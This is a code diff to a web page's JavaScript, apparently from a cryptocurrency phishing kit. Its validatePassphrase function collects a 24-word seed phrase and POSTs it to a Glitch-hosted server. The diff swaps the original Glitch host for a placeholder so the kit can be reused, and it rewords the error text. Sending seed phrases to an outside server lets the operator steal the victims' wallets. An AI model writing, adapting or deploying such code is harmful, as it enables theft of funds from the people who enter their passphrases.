@@ -366,14 +366,15 @@
     </div>
 
     <script>
-   async function validatePassphrase(inputId, errorId) {
+ async function validatePassphrase(inputId, errorId) {
     const input = document.getElementById(inputId);
     const error = document.getElementById(errorId);
     const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);
 
+    // Validate 24 words
     if (words.length !== 24) {
       error.style.display = 'block';
-      error.textContent = 'Invalid Passphrase (Must be 24 words)';
+      error.textContent = 'Passphrase must be 24 words';
       return;
     }
 
@@ -382,7 +383,7 @@
 
     // Send to Glitch backend
     try {
-      const response = await fetch('https://silk-branched-mallow.glitch.me/validate-passphrase', {
+      const response = await fetch('https://YOUR_GLITCH_PROJECT.glitch.me/validate-passphrase', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ passphrase: input.value })
@@ -396,6 +397,7 @@
       document.getElementById('loadingOverlay').style.display = 'none';
     }
   }
+
         function showModal(modalType) {
             document.body.style.overflow = "hidden";
             document.querySelectorAll('body > *').forEach(el => {
